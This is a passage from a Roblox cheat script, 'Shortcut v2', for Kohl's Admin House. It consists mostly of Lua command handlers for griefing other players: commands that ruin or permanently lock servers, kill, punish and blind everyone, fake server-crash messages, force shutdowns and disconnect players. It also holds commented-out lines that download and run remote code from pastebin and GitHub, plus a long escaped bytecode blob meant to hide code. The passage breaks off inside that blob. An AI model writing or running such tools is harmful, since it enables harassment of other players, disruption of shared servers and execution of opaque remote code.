Sonic literally. \n 86. Removewater - Removes leftover water parts SS. \n 87. Testgrab *PREMIUM* Experimental loopgrab. This one is meant to be faster but it lags. \n Note: It is faster though if you already got the pads \n 88. loadfullbuild *PREMIUM* - Loads a full downloaded build. Tysm Funzysdeath \n 89. Blackout - Makes the server go completely black. \n 90. slockmuter - Hides everyones chat UI. Useful after server locking \n Please Note: By using this cmd you're a lot more likely to get warned \n 91. FOV - Change your field of view \n 92. Lockapi - You can use our Lock API to blacklist other players with multiple methods. \n 93. Flashbang - My eyes and ears. Are they still working? \n 94. fixpads - Fixes the pads VERTICALLY \n 95. previewbuild *PREMIUM* - Previews your saved build \n 96. emergencymode1-2 \n 1 Requires antipunish to be enabled, use it when blacklisted (experimental) \n and 2 SYNAPSE ONLY. (because other executors blacklisted this dumb Roblox engine function)  will force shut-down the server regardless of the situation. This can be used if you're blacklisted or if you can't get admin \n 97. quickload -  Loads a build at max speed (result may be inaccurate). This will skip all the wait times for all the checks and instead does everything as fast as it possibly could \n 98. clearbuildfile - This will empty savedthings.lua so you can save your parts when you're starting a new creation \n 99. allantis - Enables every GUI anti. \n 100. guicmds - Every GUI cmd will be listed in here. \n 101. Disconnect (plr) - You can now disconnect players using gear. There are many disguise names for this cmd. Those being \n zahando, havefun, funtools, and playhouse \n"
                        )
                        wait(.35)
                        print' KEYBIND CONTROLS \n Btools (Premium only) "K" \n invisible "J" \n antiMessage "P" \n Pads "n" \n tp me me me "b" \n respawn "v" \n reset "c" \n ff "x" \n fly "z" Mouseattach (aim mouse at object) "m" \n Stop spamming "f" \n\n and Serverlock "L" '
                        createKohlsUi(
                            {
                                "Welcome to shortcut v2!",
                                "Created by miia#5292 & Tech0253#",
                                "1. cmds",
                                "2. mboombox",
                                "3. rej",
                                "4. spam <args>",
                                "5. boombox <args>",
                                "6. tspam <args>",
                                "7. annoy <args>",
                                "8. stop",
                                "9. super <args> \n 10. findresetpad \n 11. /cmds \n 12. shutdown \n 13. fixpaint \n Press F9 to see more"
                            }
                        )
                    end

                    if msg:lower() == prefix .. "boombox" then
                        cht("gear me 212641536")
                    end
                    if msg:lower() == prefix .. "mia all" then
                        cht("h ALL HAIL MIA!")
                        cht("char all 1104119355")
                        say("ALL HAIL MIA")
                        say("ALL HAIL MIA")
                        say("ALL HAIL MIA")
                        say("ALL HAIL MIA")
                        cht(":m ALL HAIL MIA THE OWNER OF SHORTCUT!!!")
                        cht("colorshiftbottom 1000 0 0")
                        cht("fogcolor 1000 0 0")
                        cht("fogend 9000")
                    end

                    if msg:lower() == prefix .. "visualizer" then
                        -- dont question
                        setclipboard("fogend nil moment")
                        cht("fogcolor 255 255 0")
                        cht([[h 
        
        
        
        
			        SoundVis On
        
        
        
        
			        ]])
                        soundvis = true
                        cht("time 0")
                        game:GetService("Workspace").Terrain["_Game"].Folder:WaitForChild("Sound")
                        local loud = game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness


                        repeat
                            if loud > 100 then
                            else
                                if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                                    cht("fogend "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness)
                                else
                                end
                            end;wait()
                        until soundvis == false
                    end
                    if msg:lower() == prefix .. "unvisualizer" then
                        soundvis = false
                        cht("h \n \n \n SoundVis Off \n \n \n")
                    end

                    if msg:lower() == prefix .. "crazycolors" then
                        cht("h \n \n \n fog end  n i l moment \n \n \n")
                        cht("fogend nil moment")
                        soundvis = false
                        colors = true
                      --  loadstring(game:HttpGet(("https://pastebin.com/raw/0B9sBhET"), true))()
                    end

                    if msg:lower() == prefix .. "findresetpad" then
                        cht("blind me,me,me");wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(1000000, -3, -1000000));wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(-1000000, -3, 1000000));wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(1000000, 1000003, 1000000));wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(1000000, 3, 1000000));wait()
                        cht("/pads");wait(.35)
                        cht("unblind me me me")
                       -- loadstring(
                         --   game:HttpGet(
                        --        ("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/someregenscript"),
                        --        true
                        --    )
                     --   )()
                    end
                    if msg:lower() == prefix .. "toregen" then
                        cht("blind me,me,me");wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(1000000, -3, -1000000));wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(-1000000, -3, 1000000));wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(1000000, 1000003, 1000000));wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(1000000, 3, 1000000));wait()
                        cht("/pads");wait(.35)
                        cht("unblind me me me")
                       -- loadstring(
                            --game:HttpGet(
                               -- ("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/someregenscript"),
                             --   true
                          --  )
                     --   )()
                    end
                    if msg:lower() == prefix .. "infyield" then
                       -- loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
                    end
                    if msg:lower() == prefix .. "fixpaint" then
                        cht("/color all original")
                    end
                    if msg:lower() == prefix .. "messpaint" then
                        cht("/color all random")
                    end
                    if msg:lower() == "fix" then
                        colors = false
                    end
                    if msg:lower() == "fix" then
                        colors = false
                    end
                    if msg:lower() == prefix .. "clrsfx" then
                        colors = false
                    end
                    if msg:lower() == prefix .. "clrsfx" then
                        colors = false
                        local colors = false
                    end
                    if msg:lower() == prefix .. "trashserver" then
                        padAbuse = true
                        antiTeleport = false
                        setclipboard("-52, -26623, -24 these are gamer coords")
                        cht("/toggle antivoid");wait(.25)
                        cht("/disablerc")
                        cht("/movebaseplate");wait(1.654)
                        cht("/moveresetpad");wait(.3)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(-52, -26623, -24));wait(1.35)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(-48, -10723, -18));wait(.25)
                        cht("//setspawn");wait()
                        cht("unfly me");wait(13.5)
                        cht("h \n \n \n Mr Krabs: It seems like this server got ruined!! Please join another server instead \n \n \n")
                        cht("music 0000000000000008694014229")
                        cht("fogcolor 0 0 0")
                        cht("fogend nil moment")
                        cht("kill others");wait(.5)
                        cht("//automusic 8694014229")
                        cht("punish all")
                        cht("size me .3")
                        cht("size me .3")
                        cht("size me .3")
                        cht("freeze me")
                        cht("size me 10")
                        cht("size me 10")
                        cht("size me 10")
                        cht("clone me")
                        cht("removeclones");wait(1.5)
                        cht("size all .3")
                        cht("size all .3")
                        cht("size all .3")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 10")
                        cht("size all 10")
                        cht("clone all")
                        cht("removeclones")
                        cht("removeclones");wait()
                        cht("punish all");wait(.5)
                        cht("punish all");wait(.5)
                        cht("punish all");wait(10)
                        cht(
                            "h \n \n \n Mr Krabs: It seems like this server got ruined!! Please join another server instead \n \n \n"
                        )
                        wait(10)
                        cht(
                            "h \n \n \n Mr Krabs: It seems like this server got ruined!! Please join another server instead \n \n \n"
                        )
                        wait(10)
                        cht(
                            "h \n \n \n Mr Krabs: It seems like this server got ruined!! Please join another server instead \n \n \n"
                        )
                        wait(10)
                        cht(
                            "h \n \n \n Mr Krabs: It seems like this server got ruined!! Please join another server instead \n \n \n"
                        )
                        wait(4.5)
                        cht(
                            "//tspam h \n \n \n Mr Krabs: It seems like this server got ruined!! Please join another server instead \n \n \n"
                        ) -- This is what organized code looks like ^^^
                        cht("/toggle antivoid")
                    end
                    if msg:lower() == prefix .. "kill2spawns" then
                        logn("Use //permaslock to kill only 2")
                    end
                    if msg:lower() == prefix .. "kill1spawn" then
                        logn("Use //finishps to kill only one")
                    end
                    if msg:lower() == prefix .. "temp1" then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(-29, 4, -26))
                        cht("/beeeeeone");wait(1)
                        cht("unpunish me,me,me")
                    end
                    if msg:lower() == prefix .. "finishps" then
                        cht("//movedb")
                        cht("/unadmin");wait()
                        cht(
                            "punish 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 others"
                        )
                        wait()
                        cht(
                            "blind 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 others"
                        )
                        cht("/regpiss");wait(1.35)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(41999, -159500, -26));wait(2)
                        cht("/beeeeeone");wait(1)
                        cht("unpunish me,me,me")
                    end
                    if msg:lower() == prefix .. "permaslock" then --game:GetService("Workspace").FallenPartsDestroyHeight = 0 / 0
                        game:GetService("Workspace").FallenPartsDestroyHeight = 0 / 0
                        logn(
                            "This often requires a rejoin because of lag \n If it fails to move the spawns rejoin then try again."
                        )
                        wait(1)
                        game.Players:Chat("/toggle antivoid")
                        game.Players:Chat("/toggle antikill")
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(-22222, -466969, -420420))
                            game.Players:Chat("/getspawn");wait(10)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(-999999, -486969, -420420))
                            game.Players:Chat("/gutspawn");wait(10)
                            game.Players:Chat("logn type //finishps to finish this and to permanently lock the server");wait(10)
                            game.Players:Chat("logn type //finishps to finish this and to permanently lock the server")
                    end
                    if msg:lower() == prefix .. "resetspawn" then
                        game:GetService("Workspace").FallenPartsDestroyHeight = 0 / 0 ;wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(Vector3.new(-41, 4, -26));wait()
                            game.Players:Chat("//setspawn");wait(15)
                        game:GetService("Workspace").FallenPartsDestroyHeight = -500
                    end
                    if msg:lower() == prefix .. "fixantitp" then
                        antiTeleport = false
                        cht("respawn me,me,me,me,me,me,me,me,me,me,me,me");cht("respawn me,me,me,me,me,me,me,me,me,me,me,me");wait(.5);cht("respawn me,me,me,me,me,me,me,me,me,me,me,me");cht("respawn me,me,me,me,me,me,me,me,me,me,me,me");wait(1)
                        antiTeleport = false
                        cht("-reegeennbypas1");wait(.5);cht("-reegeennbypas1");cht("-reegeennbypas1");cht("-reegeennbypas1")
                        cht("-reegeennbypas1");wait(.5)
                        antiTeleport = true ;wait(.5);cht("-reegeennbypas1");cht("-reegeennbypas1");cht("-reegeennbypas1");wait(.5)
                        cht("reset me me me me me me")
                        antiTeleport = false
                    end
                    if msg:lower() == prefix .. "breakcam" then
                        cht("/disablerc");wait(2)
                        cht("ungear all")
                    end
                    if msg:lower() == prefix .. "fov" then
                        cht("pm me Missing argument, \n low \n  mid \n original \n high \n max \n random")
                        logn("FOV low \n FOV mid \n FOV original etc")
                    end
                    if msg:lower() == prefix .. "part" then
                        cht("invis me")
                        cht("stun me")
                        cht("freeze me")
                        cht("name me invisible core");wait(.3)
                        cht("clone me")
                        cht("outdoorambient 255 255 255");wait()
                        cht("reset me");wait(.7)
                        cht("gear me 0000000000000000000000000000000000000123234673")
                        cht("pm me Hit the block with the Knife");wait(10)
                        cht("gear me 000000000000000000000000000000000000018474459")
                    end
                    if msg:lower() == prefix .. "idle" then
                        cht("/trap me");wait(.5)
                        cht("fly me")
                        cht("god 00000000000000000000000000000000000000 me")
                        cht("fly me")
                        logn("Your moving legs is only client sided")
                    end
                    if msg:lower() == prefix .. "emoji" then
                        --loadstring(
                           -- game:HttpGet(
                             --   ("https://raw.githubusercontent.com/T3chn0w1thth4t/garbage/main/emojis.txt"),
                            --    true
                          --  )
                        )() ;wait(.5)
                        cht("pm me Don't chat until this message vanishes")
                        cht("god 00000000000000000000000000000000000000 me");wait(5)
                        logn("You may now chat")
                    end

                    if msg:lower() == prefix .. "afternoon" then
                        cht("colorshifttop 600 400 10")
                        cht("colorshiftbottom 600 400 10")
                        cht("time 16")
                    end
                    if msg:lower() == prefix .. "error" then
                        cht("/toggle antikill")
                        cht("music 1835352438")
                        cht(
                            [[h  

























_______________________________________




 :(
__________________________

The server has glitched because this script has detected an error.

Server will be back online soon.

_________________________________
Additional information - Shortcut v2 has taken over Kohls.

]]
                        )
                        cht("fogcolor 1000 0 0");wait(1.5)
                        cht("//tempcrash");wait(3)
                        cht("fix")
                        cht("unchar all");wait(6)
                        cht("clr")
                    end
                    if msg:lower() == prefix .. "up" then
                        game.Players.LocalPlayer.Character:Destroy()
                        cht("unpunish me " .. math.random(1, 1000))
                        cht("refresh me " .. math.random(1, 1000))
                        cht("refresh me " .. math.random(1, 1000))
                    end
                    if msg:lower() == prefix .. "loopgrab" then
                        padAbuse = true
                    end
					if msg:lower() == prefix .. "testgrab" then
                        testgrab = true
						logn("untestgrab to undo")
                    end
					if msg:lower() == prefix .. "untestgrab" then
                        testgrab = false
                    end
                    if msg:lower() == prefix .. "killpaintui" then
                        somethingsmart = true ;wait(25)
                        logn("Insert framedrop. \n It will go over soon don't worry.")
                        somethingsmart = false
                    end
                    if msg:lower() == prefix .. "temploopgrab" then
                        temploopgrab = true
                    end
                    if msg:lower() == prefix .. "superloopgrab" then
                        cht("//infyield")
                        cht("/loopgrab")
                        testgrab = true
                        perm = true
                        wait(1.5)
                        cht("/spam /allpadspiss " .. math.random(1, 1000))
                        cht("//spam /allpadspiss " .. math.random(1, 1000))
                        cht("//super /allpadspiss " .. math.random(1, 1000))
                        cht("/permpiss");wait(1.5)
                        execCmd("noclip");wait(15)
                        cht("/permpiss")
                        cht("//temploopgrab")
                        logn("//unsuperloopgrab disables this")
                        perm = false ;wait()
                        perm = true
                        wait(3.55)
                        cht("//untestgrab")
                    end
                    if msg:lower() == prefix .. "unsuperloopgrab" then
                        cht("/unloopgrab")
                        padAbuse = false
                        perm = false ;wait(1.5)
                        cht("//stop")
                        cht("/nonperm");wait(1.5)
                        execCmd("clip");wait(15)
                        cht("//untemploopgrab")
                        logn("Rejoin to get the pads back in place on your client")
                        perm = false
                    end
                    if msg:lower() == prefix .. "unloopgrab" then
                        padAbuse = false
                    end
                    if msg:lower() == prefix .. "untemploopgrab" then
                        temploopgrab = false
                    end
                    if msg:lower() == prefix .. "oldantitp" then
                        antiTeleport = true
                        logn("Use //fixantitp to turn this off")
                    end
                    if msg:lower() == prefix .. "tabcheck" then
                        autoafk = true
                        logn("//untabcheck turns this off")
                    end
                    if msg:lower() == prefix .. "untabcheck" then
                        autoafk = false
                    end
                    if msg:lower() == prefix .. "antiabuse" then
                        --loadstring(game:HttpGet(("https://pastebin.com/raw/mPeFQEi9"), true))()
                    end
                    if msg:lower() == prefix .. "fixcam" then
                        --loadstring(game:HttpGet(("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/RobloxCameraFixScript.lua"),true))()
                        --loadstring(
                           -- game:HttpGet(
                          --      ("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/enablerc.txt"),
                          --      true
                        --    )
                       -- )()
                    end
                    if msg:lower() == prefix .. "breakcam" then
                        cht("/disablerc");wait(2)
                        cht("ungear all")
                    end
                    if msg:lower() == prefix .. "invite" then
                        setclipboard(".gg/65yHbG4Wfa")
                        logn("Set to clipboard")
                    end
                    if msg:lower() == prefix .. "TESTCMD" then
                        setclipboard("Test")
                        print("Works")
                    end
                    if msg:lower() == prefix .. "startup" then
                        task.wait(1.65)
                        task.wait();cht(shared.startupcmd1)
                        task.wait();cht(shared.startupcmd2)
                        task.wait();cht(shared.startupcmd3)
                        task.wait();cht(shared.startupcmd4)
                        task.wait();cht(shared.startupcmd5)
                        task.wait();cht(shared.startupcmd6)
                    end
                    if msg:lower() == prefix .. "guicmds" then
                        rconsoleprint("If the GUI button is there but the cmd isn't then that means that there was already a cmd for it.")
                        rconsoleprint("The prefix is still // for those cmds. They're just seperated \n Also the * symbol doesn't count though.")
                        rconsoleprint("-\n");rconsoleprint("-\n");rconsoleprint("-\n");rconsoleprint("-\n");rconsoleprint("-\n");rconsoleprint("-\n")
                        rconsoleprint("@@LIGHT_RED@@")
                        rconsoleprint("\nguiinput cmds")
                        rconsoleprint("\nguiinput rainbowex")
                        rconsoleprint("\nguiinput clickexplode")
                        rconsoleprint("\nguiinput clickpadban")
                        rconsoleprint("\nguiinput clickfard")
                        rconsoleprint("\nguiinput clickannoy")
                        rconsoleprint("\nguiinput hideregenpad")
                        rconsoleprint("\nguiinput deleteregenpad")
                        rconsoleprint("\nguiinput rainbowpads")
                        rconsoleprint("\nguiinput deleteadminpads")
                        rconsoleprint("\nguiinput noadmin lagger fe")
                        rconsoleprint("\nguiinput silent cmds")
                        rconsoleprint("\nguiinput builds")
                        rconsoleprint("\nguiinput f3x instead of btools")
                        rconsoleprint("\nguiinput antigears")
                        rconsoleprint("\nguiinput antilag")
                        rconsoleprint("\nguiinput findregen2")
                        rconsoleprint("\nguiinput loadpads")
                        rconsoleprint("\nguiinput findregen3")
                        rconsoleprint("\nguiinput antispeed")
                        rconsoleprint("\nguiinput perm")
                        rconsoleprint("\nguiinput guns")
                        rconsoleprint("\nguiinput executor specs")
                        rconsoleprint("\nguiinput antipunish")
                        rconsoleprint("\nguiinput autoheal")
                        rconsoleprint("\nguiinput antiblind")
                        rconsoleprint("\nguiinput antisetgrav")
                        rconsoleprint("\nguiinput antiattach")
                        rconsoleprint("\nguiinput antiteleport")
                        rconsoleprint("-\n")
                        rconsoleprint("@@LIGHT_GRAY@@")
                        rconsoleprint("Scroll all the way to the top for information")
                    end
                    if msg:lower() == prefix .. "clearbuildfile" then
                        writefile("savedthings.lua", '')
                    end
                    if msg:lower() == prefix .. "quickload" then
                        logn("It's recommended to have Anti Punish Enabled so people are less likely to sabotage you")
                        cht("h \n\n\nServer Message: I'm in a big hurry right now.\n\n\n")
                        cht("/toggle antivoid")
                        cht("invis me")
                        cht("unchar others")
                        cht("//movedb");task.wait()
                        --// Quickload \\-- Bytecode of course because this piece of shit isn't obfuscating otherwise
                        --loadstring("\45\45\47\47\32\67\104\97\116\98\121\112\97\115\115\32\92\92\45\45\10\108\111\99\97\108\32\67\104\97\116\66\97\114\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\80\108\97\121\101\114\71\117\105\46\67\104\97\116\46\70\114\97\109\101\46\67\104\97\116\66\97\114\80\97\114\101\110\116\70\114\97\109\101\46\70\114\97\109\101\46\66\111\120\70\114\97\109\101\46\70\114\97\109\101\46\67\104\97\116\66\97\114\10\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\99\104\116\40\109\97\115\115\97\103\101\41\10\32\32\32\32\67\104\97\116\66\97\114\58\83\101\116\84\101\120\116\70\114\111\109\73\110\112\117\116\40\109\97\115\115\97\103\101\41\10\32\32\32\32\103\97\109\101\46\80\108\97\121\101\114\115\58\67\104\97\116\40\109\97\115\115\97\103\101\41\10\32\32\32\32\67\104\97\116\66\97\114\46\84\101\120\116\32\61\32\34\34\10\101\110\100\10\45\45\47\47\32\81\117\105\99\107\108\111\97\100\32\92\92\45\45\10\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\116\97\107\101\112\97\114\116\116\111\40\112\97\114\116\116\44\32\99\102\114\97\109\41\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\114\97\110\100\111\109\115\105\109\40\41\10\9\9\108\111\99\97\108\32\116\97\98\108\101\115\105\109\32\61\32\123\34\124\34\44\32\34\60\34\44\32\34\46\34\44\32\34\62\34\44\32\34\47\34\44\32\34\63\34\44\32\34\59\34\44\32\34\58\34\44\32\34\64\34\44\32\34\39\34\44\32\34\126\34\44\32\34\35\34\44\32\34\93\34\44\32\34\125\34\44\32\34\91\34\44\32\34\123\34\44\32\34\61\34\44\32\34\43\34\44\32\34\45\34\44\32\34\95\34\44\32\34\41\34\44\32\34\40\34\44\32\34\42\34\44\32\34\38\34\44\32\34\94\34\44\32\34\37\34\44\32\34\36\34\44\32\34\33\34\125\10\9\9\114\101\116\117\114\110\32\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\10\9\101\110\100\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\119\97\105\116\102\111\114\105\118\111\114\121\40\41\10\9\9\114\101\112\101\97\116\10\9\9\9\105\102\32\110\111\116\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\46\84\101\114\114\97\105\110\91\34\95\71\97\109\101\34\93\46\65\100\109\105\110\46\80\97\100\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\78\97\109\101\32\46\46\32\34\39\115\32\97\100\109\105\110\34\41\32\116\104\101\110\10\9\9\9\9\105\102\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\46\84\101\114\114\97\105\110\91\34\95\71\97\109\101\34\93\46\65\100\109\105\110\46\80\97\100\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\84\111\117\99\104\32\116\111\32\103\101\116\32\97\100\109\105\110\34\41\32\116\104\101\110\10\9\9\9\9\9\108\111\99\97\108\32\112\97\100\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\46\84\101\114\114\97\105\110\91\34\95\71\97\109\101\34\93\46\65\100\109\105\110\46\80\97\100\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\84\111\117\99\104\32\116\111\32\103\101\116\32\97\100\109\105\110\34\41\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\101\97\100\34\41\10\9\9\9\9\9\108\111\99\97\108\32\104\101\97\100\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\76\101\102\116\32\76\101\103\34\41\10\9\9\9\9\9\102\105\114\101\116\111\117\99\104\105\110\116\101\114\101\115\116\40\112\97\100\44\32\104\101\97\100\44\32\49\41\10\9\9\9\9\9\102\105\114\101\116\111\117\99\104\105\110\116\101\114\101\115\116\40\112\97\100\44\32\104\101\97\100\44\32\48\41\10\9\9\9\9\101\108\115\101\10\9\9\9\9\9\114\101\103\101\110\40\41\10\9\9\9\9\101\110\100\10\9\9\9\101\110\100\10\9\9\9\116\97\115\107\46\119\97\105\116\40\41\10\9\9\9\105\102\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\66\97\99\107\112\97\99\107\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\34\41\32\116\104\101\110\10\9\9\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\58\69\113\117\105\112\84\111\111\108\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\66\97\99\107\112\97\99\107\46\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\41\10\9\9\9\101\110\100\10\9\9\9\105\102\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\34\41\32\116\104\101\110\10\10\9\9\9\101\108\115\101\10\9\9\9\9\99\104\116\40\34\103\101\97\114\32\109\101\32\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\49\48\56\49\53\56\51\55\57\34\41\10\9\9\9\9\116\97\115\107\46\119\97\105\116\40\46\50\41\10\9\9\9\101\110\100\10\9\9\9\116\97\115\107\46\119\97\105\116\40\41\10\9\9\117\110\116\105\108\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\34\41\10\9\9\116\97\115\107\46\119\97\105\116\40\46\48\55\53\41\10\9\101\110\100\10\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\46\70\97\108\108\101\110\80\97\114\116\115\68\101\115\116\114\111\121\72\101\105\103\104\116\32\61\32\34\110\97\110\34\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\99\108\105\99\107\105\118\40\41\10\9\9\108\111\99\97\108\32\105\118\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\34\41\10\9\9\114\101\112\101\97\116\10\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\9\117\110\116\105\108\32\105\118\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\82\101\109\111\116\101\34\41\10\9\9\108\111\99\97\108\32\82\101\109\111\116\101\32\61\32\105\118\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\82\101\109\111\116\101\34\41\10\9\9\82\101\109\111\116\101\58\70\105\114\101\83\101\114\118\101\114\40\69\110\117\109\46\75\101\121\67\111\100\101\46\69\41\10\9\101\110\100\10\10\9\108\111\99\97\108\32\112\97\114\116\32\61\32\112\97\114\116\116\10\9\108\111\99\97\108\32\112\111\115\105\116\105\111\110\32\61\32\99\102\114\97\109\10\9\108\111\99\97\108\32\115\112\111\115\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\32\126\61\32\112\97\114\116\32\97\110\100\32\118\58\73\115\65\40\34\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\118\46\67\97\110\67\111\108\108\105\100\101\32\61\32\102\97\108\115\101\10\9\9\101\110\100\10\9\101\110\100\10\9\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\71\114\97\118\105\116\121\32\61\32\48\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\65\110\99\104\111\114\101\100\32\61\32\116\114\117\101\10\9\116\97\115\107\46\119\97\105\116\40\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\65\110\99\104\111\114\101\100\32\61\32\102\97\108\115\101\10\9\116\97\115\107\46\119\97\105\116\40\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\112\111\115\105\116\105\111\110\10\9\116\97\115\107\46\119\97\105\116\40\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\112\111\115\105\116\105\111\110\10\9\116\97\115\107\46\11